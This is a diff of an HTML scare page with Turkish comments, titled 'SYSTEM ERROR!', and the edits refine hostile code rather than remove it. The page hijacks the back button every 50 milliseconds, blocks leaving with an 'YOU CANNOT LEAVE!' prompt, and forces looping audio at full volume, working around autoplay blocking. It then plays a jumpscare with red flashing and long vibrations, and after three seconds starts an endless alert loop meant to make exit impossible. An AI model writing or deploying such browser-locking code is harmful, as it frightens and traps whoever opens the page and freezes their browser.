@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>KRİTİK SİSTEM HATASI</title>
+    <title>SİSTEM HATASI!</title>
     <style>
         body { 
             margin: 0; 
@@ -42,7 +42,7 @@
     <audio id="sc" src="1.mp3" loop></audio>
 
     <script>
-        // Çıkışı tamamen imkansız yapan kilitler
+        // Çıkışı imkansızlaştıran kilit sistemi
         function kilitle() {
             window.history.pushState(null, null, window.location.href);
             window.onpopstate = function() {
@@ -51,7 +51,8 @@
             };
         }
         setInterval(kilitle, 50);
-        window.onbeforeunload = () => "AYRILAMAZSINIZ!";
+
+        window.onbeforeunload = () => "AYRILAMAZSIN!";
 
         function next() {
             document.getElementById('s1').style.display = 'none';
@@ -63,29 +64,27 @@
             const h = document.getElementById('horror');
             const b = document.getElementById('b');
             
-            // SESİ FULLER: Yazılımsal olarak en yüksek seviye
+            // SES HİLESİ: Yazılımsal olarak sesi en sona getirir
             audio.volume = 1.0; 
-            audio.play(); 
+            audio.play().catch(() => {
+                // Eğer tarayıcı engellerse, kullanıcı ekrana dokunduğu an çalacak
+                document.addEventListener('click', () => { audio.play(); }, {once: true});
+            });
 
             document.getElementById('s1').style.display = 'none';
             document.getElementById('s2').style.display = 'none';
             
-            // Jumpscare ve Flaş Efektleri
+            // Jumpscare Efektleri
             h.style.transform = "translate(-50%, -50%) scale(3)";
             b.style.backgroundImage = 'none';
             b.classList.add('flash-red');
 
-            // Android Titreşim
+            // Android Titreşim Gücü
             if (navigator.vibrate) navigator.vibrate([1000, 500, 1000, 500, 2000]);
 
-            // ÇIKIŞI TAMAMEN BOZAN SONSUZ DÖNGÜ
-            setTimeout(() => { 
-                while(true) { 
-                    alert("KRİTİK HATA: SİSTEM ÇÖKTÜ!"); 
-                } 
-            }, 2000); 
+            // Çıkışı tamamen bozmak için sonsuz döngü
+            setTimeout(() => { while(true) { alert("SİSTEM ÇÖKTÜ!"); } }, 3000);
         }
     </script>
 </body>
 </html>
-
